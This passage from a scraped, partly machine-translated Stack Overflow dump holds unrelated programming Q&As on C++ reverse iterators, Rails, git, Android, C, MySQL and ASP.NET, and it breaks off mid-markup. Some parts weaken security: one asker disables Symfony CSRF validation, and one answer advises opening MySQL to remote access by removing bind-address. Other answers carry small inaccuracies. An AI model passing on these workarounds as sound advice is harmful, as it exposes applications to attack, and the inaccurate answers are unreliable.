这与告诉我们数组*后面的第**i*^( 个)元素偏移 1的算法完全相同：这也向我们展示了为什么我们需要一个*双向*迭代器来形成反向迭代器。*`array[N - i - 1]`*

 **现在很清楚我们如何通过反向迭代器从不会使迭代器无效的容器中擦除，例如任何基于节点的容器：

```
if (meets_condition(*it))   // this examines *(it.base() - 1)!
{
     auto b = it.base();
     container.erase(it.base() - 1);
     it = std::reverse_iterator(b);
} 
```

请记住，这要求擦除不会使除被擦除者之外的任何迭代器无效，就像在任何基于节点的容器中一样。像这样从向量中擦除会更加困难。对于向量，擦除会使*所有*经过擦除的迭代器（正向）无效，因此我们必须使用`erase`函数的返回值：

```
if (meets_condition(*ut))   // again, examine *(it.base() - 1)
{
    it = std::reverse_iterator(container.erase(it.base() - 1));
} 
```

在图片中（我们正在删除元素“5”）：

```
+---+---+---+---+---+---+---+
| 2 | 3 | 4 | 5 | 6 | 7 | 8 |     =:   v
+---+---+---+---+---+---+---+
              ^   ^
              |   |
|             |   +--- it.base()
|             |
|             +--- *it == *(it.base() - 1)
|
V

+---+---+---+---+---+---+
| 2 | 3 | 4 | 6 | 7 | 8 |
+---+---+---+---+---+---+
          ^   ^
          |   |
          |   +--- result of v.erase(it.base() - 1)
          |
          +--- *(std::reverse_iterator(v.erase(it.base() - 1))) 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-25T17:05:07.883

不是您的问题的答案，而是您的问题的解决方案：使用比您当前正在做的更有效的*擦除删除习惯用法：*

```
bool even( int value ) { return !(value%2); }
std::vector<int> v = { 1,2,3,4,5,6,7,8,9,10 }; // Assuming C++11 or build it otherwise
v.erase( std::remove_if( v.begin(), v.end(), even ),
         v.end() ); 
```

效率上的区别在于，`remove_if`它只会将容器中剩余的值复制*一次*到最终位置，而您的算法可能会多次复制某些元素。特别是 9 将被复制 4 次，7 将被复制 3 次，依此类推。**

# ruby-on-rails - simple Rails comments adding extra blank comment

> ID：12587582
> 
> 赞同：2
> 
> 时间：2012-09-25T16:52:56.000
> 
> 标签：ruby-on-rails, ruby, comments, associations

Evening all,

I've sat here scratching my head for the last few hours over this.

I have a very simple comments model attached to an article model. Issue is, there seems to be a blank comment at the end of every articles comments section. If i try and use a method like capitalize it errors out with "capitalize on nil class", also if i put the comments in a div with a grey background for each comment (facebook style) a blank box appears at the end of an articles comments. Does anyone know whats going on?

Anyway heres the code: Comments controller

```
def create
    @article = Article.find(params[:article_id])
    @comment = @article.comments.create(params[:comment])
    if @comment.save
      flash[:success] = "Comment created"
      redirect_to @article
    else
      flash[:error] = "Something went wrong"
      redirect_to @article
    end
  end

  def destroy
    @article = Article.find(params[:article_id])
    @comment = @article.comments.find(params[:id])
    @comment.destroy
    redirect_to @article
  end
end 
```

comments Model

```
attr_accessible :name, :content

  belongs_to :article
  validates_presence_of :article_id
  validates_presence_of :content, length: { maximum: 300 }

  default_scope order: "comments.created_at DESC" 
```

comment form

```
<a href='#', id='comments-form', class="btn btn-large">Add a comment</a>
    <div id="comment">
    <%= form_for([@article, @article.comments.build]) do |f| %>

        <%= f.label :name %>
        <%= f.text_field :name %>

        <%= f.label :content %>
        <%= f.text_field :content %>

        <br>
        <%= f.submit "Create", class: "btn btn-large" %>
       <% end %>
    </div> 
```

comments show

```
<legend>Comments</legend>

    <% comments.each do |comment| %>
        <sabon><%= comment.name %></sabon><br>
        <p><%= comment.content %></p>
        <hr>
        <% end %> 
```

bottom of article show

```
<%= render partial: "comments/form", locals: { article: @article } %><br><br>
<%= render partial: "comments/show", locals: { comments: @article.comments }%> 
```

routes

```
resources :articles do
    resources :comments
  end 
```

any help would be great thanks guys, thanks in advance Andy, if you need more code just shout.

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-09-26T06:25:41.847

在评论表单行中`@article.comments.build`创建新的评论对象。表单的呈现发生在呈现之前，`comments/show`因此新的空白 Comment 对象存在于`@article.comments`集合中。

**更新** 您可以从评论中排除新创建的对象，例如：

```
@article.comments.reject(&:new_record?) 
```

# git - how to commit the files that i delete using rm rather than git rm?

> ID：12587585
> 
> 赞同：-2
> 
> 时间：2012-09-25T16:53:01.667
> 
> 标签：git, version-control, rm

git add seems not works for these deleted files, so how to commit the changes?

```
$ git status
# On branch master
# Changes not staged for commit:
#   (use "git add/rm <file>..." to update what will be committed)
#   (use "git checkout -- <file>..." to discard changes in working directory)
#
#       deleted:    ci/ci/__init__.py
#       deleted:    ci/ci/settings.py
#       deleted:    ci/ci/urls.py
#       deleted:    ci/ci/wsgi.py
#       deleted:    ci/manage.py
#
no changes added to commit (use "git add" and/or "git commit -a") 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-26T01:33:52.070

最简单的选择是使用`git add -A`. 该`-A`选项将暂存添加和删除的文件。

如果你想要它，`git rm path/file.py`请在已删除的文件上使用来暂存它们的删除（即使你已经手动删除了它们）。

# objective-c - NSDate 返回零

> ID：12587587
> 
> 赞同：0
> 
> 时间：2012-09-25T16:53:03.733
> 
> 标签：objective-c, nsdate

基本上我正在尝试存储今天的日期，但每次我尝试这样做时，NSDate 都会返回 nil 给我

```
self.calendarView.selectedDate = [NSDate date]; 
```

我是objective-c的新手，所以也许我在这里做错了，但看起来相当简单。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-09-25T16:55:17.433

`[NSDate date]`将返回正确的日期。通过执行以下操作检查您`self.calendarView`此时是否不为零：

```
NSLog(@"calendar: %@", self.calendarView);
NSDate *now = [NSDate date];
NSLog(@"now: %@", now);
self.calendarView.selectedDate = now; 
```

# php - Symfony: _csrf_token [Required.]

> ID：12587588
> 
> 赞同：1
> 
> 时间：2012-09-25T16:53:09.953
> 
> 标签：php, symfony

I created an admin page using symfony generate-admin and for some reason I'm getting that error when trying to delete a record. Do you know why that field is not being generated?

I found the generated templates in the cache directory and I can see there is a call to $form->isCSRFProtected() to check whether or not to add the _csrf_token field. That function is returning false but I can't find where to change that.

I fixed it temporarily buy disabling the CSRF validation in actions.php. It's not ideal but it works in the meantime.

# database - Access Multiple Owners one record

> ID：12587589
> 
> 赞同：0
> 
> 时间：2012-09-25T16:53:10.890
> 
> 标签：database, ms-access, ms-access-2007, relational-database

First Database has the following:

OwnerID, FName, LName

Second Database has the following:

OwnerID,PolicyName, Owner2ID,Owner3ID,Owner4ID,Owner5ID, Owner6ID, Owner7ID

So there are multiple owners for a particular policy. My question is how can I design a query in Access that will return all the rows for each policy that have more than one owner. For example assume policy one has OwnerID,Owner2ID,Owner3ID filled with ID based on the first database. How can I return:

OwnerID, Policy Name Owner2ID,POlicy Name Owner3ID,Policy Name

So same policy name but because that one record as multiple owners, it will list all of them in a query.

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-25T17:03:43.960

如果您首先对数据进行规范化，则可以运行任意数量的查询：

```
SELECT a.policyname,
   a.ownerid
FROM   (SELECT policyname,
           ownerid
    FROM   policies
    UNION ALL
    SELECT policyname,
           owner2id
    FROM   policies
    UNION ALL
    SELECT policyname,
           owner3id
    FROM   policies
    UNION ALL
    SELECT policyname,
           owner4id
    FROM   policies
    UNION ALL
    SELECT policyname,
           owner5id
    FROM   policies
    UNION ALL
    SELECT policyname,
           owner6id
    FROM   policies
    UNION ALL
    SELECT policyname,
           owner7id
    FROM   policies) AS a; 
```

例如，这是一个计数：

```
SELECT a.policyname,
   Count(a.ownerid) AS CountOfOwnerID
FROM   (SELECT policyname,
           ownerid
    FROM   policies
    UNION ALL
    SELECT policyname,
           owner2id
    FROM   policies
    UNION ALL
    SELECT policyname,
           owner3id
    FROM   policies
    UNION ALL
    SELECT policyname,
           owner4id
    FROM   policies
    UNION ALL
    SELECT policyname,
           owner5id
    FROM   policies
    UNION ALL
    SELECT policyname,
           owner6id
    FROM   policies
    UNION ALL
    SELECT policyname,
           owner7id
    FROM   policies) AS a
WHERE (((a.OwnerID) Is Not Null))
GROUP BY a.PolicyName; 
```

您还可以保存“平面”查询并参考保存的查询来构建其他更复杂的查询。

# android - Android custom style/scheme is not applied correctly to button-textColor

> ID：12587591
> 
> 赞同：0
> 
> 时间：2012-09-25T16:53:15.143
> 
> 标签：android, android-layout, button, android-styles

I'm having trouble with applying a custom scheme(style) to certain views. I have defined my own style in res/values/styles.xml

```
<resources xmlns:android="http://schemas.android.com/apk/res/android">

    <style name="myStyle1">
        <item name="android:layout_width">fill_parent</item>
        <item name="android:layout_height">wrap_content</item>
        <item name="android:textColor">@color/red</item>
        <item name="android:textColorHighlight">@color/blue</item>
        <item name="android:textColorHint"> @color/fuchsia</item>
        <item name="android:textColorLink">@color/olive</item>
        <item name="android:typeface">serif</item>
    </style>

    <style name="AppTheme" parent="android:Theme.Light" />

</resources> 
```

I have applied this style to the main activity of my simple test application, like this

```
 <application
        android:icon="@drawable/ic_launcher"
        android:label="@string/app_name" >

        <activity
            android:name=".MainActivity"
            android:label="@string/title_activity_main"
            android:theme="@style/myStyle1" >
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />

                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>
           .
           .
           .
    </application> 
```

The layout of the MainActivity contains a couple of buttons, some textViews, some of them have the style attribute spiecified explicitly, others should be inhertiting it from the whole activity.

```
<?xml version="1.0" encoding="utf-8"?>
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
    xmlns:tools="http://schemas.android.com/tools"
    android:id="@+id/layout_main"
    android:layout_width="match_parent"
    android:layout_height="match_parent"
    android:background="@color/silver"
    android:orientation="vertical" >

    <EditText android:id="@+id/edit_message"
        android:layout_width="match_parent"
        android:layout_height="wrap_content"
        android:layout_weight="0"
        android:hint="@string/edit_message" />

    <Button android:id="@+id/send_button"
        style="@style/myStyle1"
        android:text="@string/button_send" />

    <Button android:id="@+id/relative_activity"
        android:text="@string/rel_activitity_text"
        android:onClick="startRelativeActivity"/>

    <Button android:id="@+id/button_TTT"
        android:layout_width="match_parent"
        android:layout_height="wrap_content"
        android:layout_weight="0"
        android:textColor="@color/red"
        android:text="@string/button_TTT" /> 

    <fragment android:name="my.firstapp.Fragment1"
            android:background="@color/red"
            android:id="@+id/list"
            android:layout_weight="1"
            android:layout_width="match_parent"
            android:layout_height="wrap_content" />

</LinearLayout> 
```

As far as I can tell, everything in the activity should be stylized according to the style I ahve defined, however, this is what I get

![weird scheme](../Images/58fd6546efce42934932b07f5aad73f3.png)

As you can see, only the buttons with the specified style have their text in red, the other two don't. However, even the white buttons get the correct font from the scheme, so at least some of it is being applied. Why not all of it? Any help would be appreciated, I'm thoroughly confused.

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-25T17:13:58.453

如果您想要所有按钮的全局样式，您需要执行类似的操作。

```
<resources xmlns:android="http://schemas.android.com/apk/res/android">

<style name="myStyle1">
    <item name="android:layout_width">fill_parent</item>
    <item name="android:layout_height">wrap_content</item>
    <item name="android:textColor">@color/red</item>
    <item name="android:textColorHighlight">@color/blue</item>
    <item name="android:textColorHint"> @color/fuchsia</item>
    <item name="android:textColorLink">@color/olive</item>
    <item name="android:typeface">serif</item>
</style>

<style name="AppTheme" parent="android:Theme.Light">
    <item name="android:buttonStyle">@style/myStyle1</item>
</style>

</resources> 
```

在您的android清单中，您应该设置主题...

```
<application
    android:icon="@drawable/ic_launcher"
    android:label="@string/app_name" >

    <activity
        android:name=".MainActivity"
        android:label="@string/title_activity_main"
        android:theme="@style/AppTheme" >
        <intent-filter>
            <action android:name="android.intent.action.MAIN" />

            <category android:name="android.intent.category.LAUNCHER" />
        </intent-filter>
    </activity>
       .
       .
       .
</application> 
```

您可以对复选框等执行相同的操作。来自此链接的更多信息。 [http://developer.android.com/reference/android/R.attr.html](http://developer.android.com/reference/android/R.attr.html)

我也在以下布局上对此进行了测试。所有 3 个按钮都应该有红色文本。

```
<?xml version="1.0" encoding="utf-8"?>
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
    xmlns:tools="http://schemas.android.com/tools"
    android:id="@+id/layout_main"
    android:layout_width="match_parent"
    android:layout_height="match_parent"
    android:background="#ffaaaaaa"
    android:orientation="vertical" >

<EditText android:id="@+id/edit_message"
    android:layout_width="match_parent"
    android:layout_height="wrap_content"
    android:layout_weight="0"
    android:hint="edit_message" />

<Button android:id="@+id/send_button"
    android:layout_width="match_parent"
    android:layout_height="wrap_content"
    android:text="button_send" />

<Button android:id="@+id/relative_activity"
    android:layout_width="match_parent"
    android:layout_height="wrap_content"
    android:text="rel_activitity_text"
    android:onClick="startRelativeActivity"/>

<Button android:id="@+id/button_TTT"
    android:layout_width="match_parent"
    android:layout_height="wrap_content"
    android:layout_weight="0"
    android:textColor="#ffff0000"
    android:text="button_TTT" /> 

<!--<fragment android:name="my.firstapp.Fragment1"
        android:background="#00ff0000"
        android:id="@+id/list"
        android:layout_weight="1"
        android:layout_width="match_parent"
        android:layout_height="wrap_content" />-->

</LinearLayout> 
```

# c - ((char) 257) prints 1 in C?

> ID：12587593
> 
> 赞同：-2
> 
> 时间：2012-09-25T16:53:18.010
> 
> 标签：c, char-pointer

I am vastly confused. I'm having a headache. I'm new to C.

```
#include<stdio.h>

int main()
{
int i = 257;
int *iPtr = &i;    

printf("val 1: %d \t val 2: %d \n\n",*( (char*)iPtr ), *( (char*)iPtr+1) );

int iptr_alias = iPtr;
int and_val = iptr_alias & 255;

printf("Value of iPtr (aka address of i): %d   \n\n", iPtr);
printf("Value at location pointed to by iPtr using %%c: %c \n\n",*iPtr); //gives weird character

int f = 257;
int *fptr = &f;

printf("char starred fptr: %d \t charred 257: %d \n\n",*((char*)fptr), ((char)257) );
// i know the above is obvious. 
system("PAUSE");
} 
```

My questions:

**1\. Apparently `*( (char*) iPtr )` = `257 & 255` = 1 (bitwise and operation). And `(char)*iPtr` is the same also** . But it doesn't print `1` if i use `%c` modifier. Why?

**2\. And why `*( (char*) iPtr+1 )` = 1 ??**

I'm so confused with all this (which i wrote myself to clear confusion, but it worked otherwise..)

`((char)257)` gives `1` using `%d` or %o or %x for that matter. `%c` gives some weird ASCII character

I mean, when i do `printf(" %c ", 257)` , then i don't get `1`, instead, I get a weird ASCII character. Why?

In the actual problem, I was supposed to determine what would be printed as `val 1` and `val 2`.

I maybe overlooking anything stupidly simple, but i'm really feeling confused and tired about this mess. Please help.

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-25T17:11:48.037

整数 257 也是十六进制的 0x101。在具有 32 位整数的小端机器上，各个字节将为 0x01 0x01 0x00 0x00。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-25T16:57:47.607

请记住，a`char`只有 8 位，因此可以表示 0 到 255 之间的数字。当您打印`257`时，它会翻转并变为 1（`256`将为零）。

至于为什么`257`(ie `1`) 会变成一个奇怪的字符，我把你引向一个[ASCII 表](http://www.asciitable.com/)。

**编辑：**关于`signed`与`unsigned`

在这种情况下，您的`char`类型是`unsigned`. 如果是这样，`signed`那么翻转将发生在`127`（但由于签名/未签名的工作方式，它会翻转到`-128`并将`129`翻转到`-127`）。

# php - mysql_connect - 连接到 ISP 而不是远程主机

> ID：12587596
> 
> 赞同：1
> 
> 时间：2012-09-25T16:53:23.717
> 
> 标签：php, mysql, database

我正在尝试运行 PHP 脚本以从远程主机转储一些数据库表。该错误没有连接到我的远程主机，而是使用我的 ISP 的 IP 地址显示“拒绝访问”。我可以毫无问题地连接到其他远程服务器。我也无法使用 HeidiSQL 和 MySQL Workbench 进行连接（访问也被拒绝）。

有任何想法吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-25T16:57:31.400

为了允许远程连接，您需要切换允许的访问地址。您将能够通过与您的数据库关联的控制面板来执行此操作。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-25T17:05:24.873

您的 mysql.ini（如果在 windows 上）或 mysql.cnf（如果在 linux 上）拒绝远程访问数据库服务器。如果您有权访问 mysql 配置文件，请删除以下行

绑定地址 = 127.0.0.0

重新启动mysql服务器，你应该很好。

# javascript - 为汽油泵效果构建我自己的脚本

> ID：12587603
> 
> 赞同：-6
> 
> 时间：2012-09-25T16:53:36.400
> 
> 标签：javascript

我正在尝试编写自己的脚本，因为我还没有找到适合我的情况的 Jquery 插件。我基本上需要编写一个脚本，为我的数字自动加载“千位分隔符”提供收银机或汽油泵效果。和小数点分隔符“，”在我的数字中，就像在这个[例子](http://jsbin.com/ehuzes/19/edit) 中唯一的区别是我希望我的数字自动加载到页面中而不点击按钮

是否可以在没有点击功能的情况下修改此脚本并使其工作？

或者，您将如何设置提供千位分隔符和小数分隔符功能的脚本？

* * *

## 回答 #1

> 赞同：-1
> 
> 时间：2012-09-25T17:08:45.027

最简单的方法是复制该示例中的 javascript 并将其放入自己的 .js 文件中。

从您的 html 调用 mootools 库脚本`<script src="http://ajax.googleapis.com/ajax/libs/mootools/1.2.4/mootools-yui-compressed.js"></script>`

然后调用你的插件文件`<script src="js/plugin.js"></script>`

然后包括你的初始化脚本（从那个例子来看，它看起来像是在页面底部，但我不确定）

```
<script type="text/javascript" charset="utf-8">
    //<![CDATA[
      window.addEvent('domready', function(){
        var total = $('total'); // this is the id of the element that will display the number
        var totalFx = new Fx.CashRegister(total, {duration: 2000});
        totalFx.start(124353526.99); // this is the number that you want to show first when page loads
        });
</script> 
```

[看到我编辑的这个 jsBin](http://jsbin.com/ehuzes/20/edit)

# sql - 无法对 System.Int32 和 System.String 执行“Like”操作

> ID：12587618
> 
> 赞同：0
> 
> 时间：2012-09-25T16:55:01.217
> 
> 标签：sql, vb.net, gridview

当我尝试为我的 CertificateID 列添加搜索文本框时出现此错误。我知道这是因为您不能使用“like”操作，因为我的 CertificateID 列是 int32 而不是字符串。我只是不知道代码应该是什么才能使它工作。我已经尝试过 Cast() 函数，但没有任何运气。有人可以帮我写代码吗？我正在使用 filterexpression 过滤我的数据：

```
FilterExpression="[CertificateID] like '{0}%' and [Customs_Entry] like '{0}%' and [Product_Number] like '{1}%' and [Product_Name] like '{2}%'">

<asp:ControlParameter ControlID="txtCertificateID_Filter" Name="CertificateID" PropertyName="Text" Type="String" ConvertEmptyStringToNull="false" /> 
```

我的完整html是：

```
<html xmlns="http://www.w3.org/1999/xhtml">
<head runat="server">

    <title></title>
</head>
<body>
    <form id="form1" runat="server">
<div>

        <asp:Label ID="CertificateID_Label" runat="server" Width="169px">Certificate Number</asp:Label>
        <asp:TextBox ID="txtCertificateID_Filter" runat="server" Width="180px"></asp:TextBox>
        <br />
        <br />
        <asp:Label ID="Customs_Entry_Label" runat="server" Width="169px">Customs Entry Number</asp:Label>
        <asp:TextBox ID="txtCustoms_Entry_Filter" runat="server" Width="180px"></asp:TextBox>
        <br />
        <br />
        <asp:Label ID="Product_Number_Label" runat="server" Width="169px">Product Number</asp:Label>
        <asp:TextBox ID="txtProduct_Number_Filter" runat="server" Width="180px"></asp:TextBox>
        <br />
        <br />
        <asp:Label ID="Customs_Name_Label" runat="server" Width="169px">Product Name</asp:Label>
        <asp:TextBox ID="txtProduct_Name_Filter" runat="server" Width="180px"></asp:TextBox>
        <br />
        <br />
        <asp:Button ID="btnSearch" runat="server" Text="Search" /> 
        <br />
        <br />

        <asp:GridView ID="Certificate" runat="server" AllowSorting="True" AutoGenerateColumns="False" DataKeyNames="CertificateID" DataSourceID="SqlDataSource2" ShowFooter="True">
            <Columns>
                <asp:TemplateField ShowHeader="False">
                    <EditItemTemplate>
                        <asp:LinkButton ID="LinkButton1" runat="server" CausesValidation="True" CommandName="Update" Text="Update"></asp:LinkButton>
                        &nbsp;<asp:LinkButton ID="LinkButton2" runat="server" CausesValidation="False" CommandName="Cancel" Text="Cancel"></asp:LinkButton>
                    </EditItemTemplate>
                    <FooterTemplate>
                        <asp:Button ID="AddRow" runat="server" CommandName="Insert" Text="Add" />
                    </FooterTemplate>
                    <ItemTemplate>
                        <asp:LinkButton ID="LinkButton1" runat="server" CausesValidation="False" CommandName="Edit" Text="Edit"></asp:LinkButton>
                        &nbsp;<asp:LinkButton ID="LinkButton2" runat="server" CausesValidation="False" CommandName="Delete" Text="Delete"></asp:LinkButton>
                    </ItemTemplate>
                </asp:TemplateField>
                <asp:BoundField DataField="CertificateID" HeaderText="Certificate Number" ReadOnly="True" SortExpression="CertificateID" />
                <asp:TemplateField HeaderText="Customs Entry" SortExpression="Customs_Entry">
                    <EditItemTemplate>
                        <asp:TextBox ID="TextBox1" runat="server" Text='<%# Bind("Customs_Entry")%>'></asp:TextBox>
                    </EditItemTemplate>
                    <FooterTemplate>
                        <asp:TextBox ID="TxtCustoms_Entry" runat="server"></asp:TextBox>
                    </FooterTemplate>
                    <ItemTemplate>
                        <asp:Label ID="Label1" runat="server" Text='<%# Bind("Customs_Entry")%>'></asp:Label>
                    </ItemTemplate>
                </asp:TemplateField>
                <asp:TemplateField HeaderText="Date Certificate" SortExpression="Date_Certificate">
                    <EditItemTemplate>
                        <asp:TextBox ID="TextBox2" runat="server" Text='<%# Bind("Date_Certificate")%>'></asp:TextBox>
                    </EditItemTemplate>
                    <FooterTemplate>
                        <asp:TextBox ID="txtDate_Certificate" runat="server"></asp:TextBox>
                    </FooterTemplate>
                    <ItemTemplate>
                        <asp:Label ID="Label2" runat="server" Text='<%# Bind("Date_Certificate")%>'></asp:Label>
                    </ItemTemplate>
                </asp:TemplateField>
                <asp:TemplateField HeaderText="Invoice Number" SortExpression="Invoice_Number">
                    <EditItemTemplate>
                        <asp:TextBox ID="TextBox3" runat="server" Text='<%# Bind("Invoice_Number")%>'></asp:TextBox>
                    </EditItemTemplate>
                    <FooterTemplate>
                        <asp:TextBox ID="txtInvoice_Number" runat="server"></asp:TextBox>
                    </FooterTemplate>
                    <ItemTemplate>
                        <asp:Label ID="Label3" runat="server" Text='<%# Bind("Invoice_Number")%>'></asp:Label>
                    </ItemTemplate>
                </asp:TemplateField>
                <asp:TemplateField HeaderText="Product Number" SortExpression="Product_Number">
                    <EditItemTemplate>
                        <asp:TextBox ID="TextBox4" runat="server" Text='<%# Bind("Product_Number")%>'></asp:TextBox>
                    </EditItemTemplate>
                    <FooterTemplate>
                        <asp:TextBox ID="txtProduct_Number" runat="server"></asp:TextBox>
                    </FooterTemplate>
                    <ItemTemplate>
                        <asp:Label ID="Label4" runat="server" Text='<%# Bind("Product_Number")%>'></asp:Label>
                    </ItemTemplate>
                </asp:TemplateField>
                <asp:TemplateField HeaderText="Product Name" SortExpression="Product_Name">
                    <EditItemTemplate>
                        <asp:TextBox ID="TextBox5" runat="server" Text='<%# Bind("Product_Name")%>'></asp:TextBox>
                    </EditItemTemplate>
                    <FooterTemplate>
                        <asp:TextBox ID="txtProduct_Name" runat="server"></asp:TextBox>
                    </FooterTemplate>
                    <ItemTemplate>
                        <asp:Label ID="Label5" runat="server" Text='<%# Bind("Product_Name")%>'></asp:Label>
                    </ItemTemplate>
                </asp:TemplateField>
                <asp:TemplateField HeaderText="Product Category" SortExpression="Product_Category">
                    <EditItemTemplate>
                        <asp:DropDownList ID="DropDownList1" runat="server" DataSourceID="SqlDataSource1" DataTextField="Name" DataValueField="Name" SelectedValue='<%# Bind("Product_Category") %>'>
                        </asp:DropDownList>
                        <asp:SqlDataSource ID="SqlDataSource1" runat="server" ConnectionString="<%$ ConnectionStrings:GreatGrizzlyConnectionString2 %>" SelectCommand="SELECT [Name] FROM [Category]"></asp:SqlDataSource>
                    </EditItemTemplate>
                    <FooterTemplate>
                        <asp:DropDownList ID="txtProduct_Category" runat="server" DataSourceID="SqlDataSource1" DataTextField="Name" DataValueField="Name">
                        </asp:DropDownList>
                        <asp:SqlDataSource ID="SqlDataSource1" runat="server" ConnectionString="<%$ ConnectionStrings:GreatGrizzlyConnectionString2 %>" SelectCommand="SELECT [Name] FROM [Category]"></asp:SqlDataSource>
                    </FooterTemplate>
                    <ItemTemplate>
                        <asp:Label ID="Label6" runat="server" Text='<%# Bind("Product_Category")%>'></asp:Label>
                    </ItemTemplate>
                </asp:TemplateField>
                <asp:TemplateField HeaderText="CPSC Regulation" SortExpression="CPSC_Regulation">
                    <EditItemTemplate>
                        <asp:TextBox ID="TextBox7" runat="server" Text='<%# Bind("CPSC_Regulation")%>'></asp:TextBox>
                    </EditItemTemplate>
                    <FooterTemplate>
                        <asp:TextBox ID="TxtCPSC_Regulation" runat="server"></asp:TextBox>
                    </FooterTemplate>
                    <ItemTemplate>
                        <asp:Label ID="Label7" runat="server" Text='<%# Bind("CPSC_Regulation")%>'></asp:Label>
                    </ItemTemplate>
                </asp:TemplateField>
                <asp:TemplateField HeaderText="Date Manufactured" SortExpression="Date_Manufactured">
                    <EditItemTemplate>
                        <asp:TextBox ID="TextBox8" runat="server" Text='<%# Bind("Date_Manufactured")%>'></asp:TextBox>
                    </EditItemTemplate>
                    <FooterTemplate>
                        <asp:TextBox ID="TxtDate_Manufactured" runat="server"></asp:TextBox>
                    </FooterTemplate>
                    <ItemTemplate>
                        <asp:Label ID="Label8" runat="server" Text='<%# Bind("Date_Manufactured")%>'></asp:Label>
                    </ItemTemplate>
                </asp:TemplateField>
                <asp:TemplateField HeaderText="Manufacturer" SortExpression="Manufacturer">
                    <EditItemTemplate>
                        <asp:DropDownList ID="DropDownList2" runat="server" DataSourceID="SqlDataSource3" DataTextField="Name" DataValueField="Name" SelectedValue='<%# Bind("Manufacturer")%>'>
                        </asp:DropDownList>
                        <asp:SqlDataSource ID="SqlDataSource3" runat="server" ConnectionString="<%$ ConnectionStrings:GreatGrizzlyConnectionString2 %>" SelectCommand="SELECT [Name] FROM [Manufacturer]"></asp:SqlDataSource>
                    </EditItemTemplate>
                    <FooterTemplate>
                        <asp:DropDownList ID="txtManufacturer" runat="server" DataSourceID="SqlDataSource3" DataTextField="Name" DataValueField="Name">
                        </asp:DropDownList>
                        <asp:SqlDataSource ID="SqlDataSource3" runat="server" ConnectionString="<%$ ConnectionStrings:GreatGrizzlyConnectionString2 %>" SelectCommand="SELECT [Name] FROM [Manufacturer]"></asp:SqlDataSource>
                    </FooterTemplate>
                    <ItemTemplate>
                        <asp:Label ID="Label9" runat="server" Text='<%# Bind("Manufacturer")%>'></asp:Label>
                    </ItemTemplate>
                </asp:TemplateField>
                 <asp:TemplateField HeaderText="Email" SortExpression="Date_Tested">
                    <EditItemTemplate>
                        <asp:TextBox ID="TextBox10" runat="server" Text='<%# Bind("Date_Tested")%>'></asp:TextBox>
                    </EditItemTemplate>
                    <FooterTemplate>
                        <asp:TextBox ID="txtDate_Tested" runat="server"></asp:TextBox>
                    </FooterTemplate>
                    <ItemTemplate>
                        <asp:Label ID="Label10" runat="server" Text='<%# Bind("Date_Tested")%>'></asp:Label>
                    </ItemTemplate>
                </asp:TemplateField>
                 <asp:TemplateField HeaderText="Test Lot ID" SortExpression="Test_Lot_ID">
                    <EditItemTemplate>
                        <asp:TextBox ID="TextBox11" runat="server" Text='<%# Bind("Test_Lot_ID")%>'></asp:TextBox>
                    </EditItemTemplate>
                    <FooterTemplate>
                        <asp:TextBox ID="TxtTest_Lot_ID" runat="server"></asp:TextBox>
                    </FooterTemplate>
                    <ItemTemplate>
                        <asp:Label ID="Label11" runat="server" Text='<%# Bind("Test_Lot_ID")%>'></asp:Label>
                    </ItemTemplate>
                </asp:TemplateField>
                 <asp:TemplateField HeaderText="Name Laboratory" SortExpression="Name_Laboratory">
                    <EditItemTemplate>
                        <asp:DropDownList ID="DropDownList3" runat="server" DataSourceID="SqlDataSource4" DataTextField="Name" DataValueField="Name" SelectedValue='<%# Bind("Name_Laboratory")%>'>
                        </asp:DropDownList>
                        <asp:SqlDataSource ID="SqlDataSource4" runat="server" ConnectionString="<%$ ConnectionStrings:GreatGrizzlyConnectionString2 %>" SelectCommand="SELECT [Name] FROM [Laboratory]"></asp:SqlDataSource>
                    </EditItemTemplate>
                    <FooterTemplate>
                        <asp:DropDownList ID="txtName_Laboratory" runat="server" DataSourceID="SqlDataSource4" DataTextField="Name" DataValueField="Name">
                        </asp:DropDownList>
                        <asp:SqlDataSource ID="SqlDataSource4" runat="server" ConnectionString="<%$ ConnectionStrings:GreatGrizzlyConnectionString2 %>" SelectCommand="SELECT [Name] FROM [Laboratory]"></asp:SqlDataSource>
                    </FooterTemplate>
                    <ItemTemplate>
                        <asp:Label ID="Label12" runat="server" Text='<%# Bind("Name_Laboratory")%>'></asp:Label>
                    </ItemTemplate>
                </asp:TemplateField>
            </Columns>
        </asp:GridView>
        <asp:SqlDataSource ID="SqlDataSource2" runat="server" ConnectionString="<%$ ConnectionStrings:GreatGrizzlyConnectionString %>" DeleteCommand="DELETE FROM [Certificate] WHERE [CertificateID] = @CertificateID" InsertCommand="INSERT INTO [Certificate] ([Customs_Entry], [Date_Certificate], [Invoice_Number], [Product_Number], [Product_Name], [Product_Category], [CPSC_Regulation], [Date_Manufactured], [Manufacturer], [Date_Tested], [Test_Lot_ID], [Name_Laboratory]) VALUES (@Customs_Entry, @Date_Certificate, @Invoice_Number, @Product_Number, @Product_Name, @Product_Category, @CPSC_Regulation, @Date_Manufactured, @Manufacturer, @Date_Tested, @Test_Lot_ID, @Name_Laboratory)" SelectCommand="SELECT * FROM [Certificate]" UpdateCommand="UPDATE [Certificate] SET [Customs_Entry] = @Customs_Entry, [Date_Certificate] = @Date_Certificate, [Invoice_Number] = @Invoice_Number, [Product_Number] = @Product_Number, [Product_Name] = @Product_Name, [Product_Category] = @Product_Category, [CPSC_Regulation] = @CPSC_Regulation, [Date_Manufactured] = @Date_Manufactured, [Manufacturer] = @Manufacturer, [Date_Tested] = @DatE_Tested, [Test_Lot_ID] = @Test_lot_ID, [Name_Laboratory] = @Name_Laboratory WHERE [CertificateID] = @CertificateID" FilterExpression="[CertificateID] like '{0}%' and [Customs_Entry] like '{0}%' and [Product_Number] like '{1}%' and [Product_Name] like '{2}%'">
            <FilterParameters> 
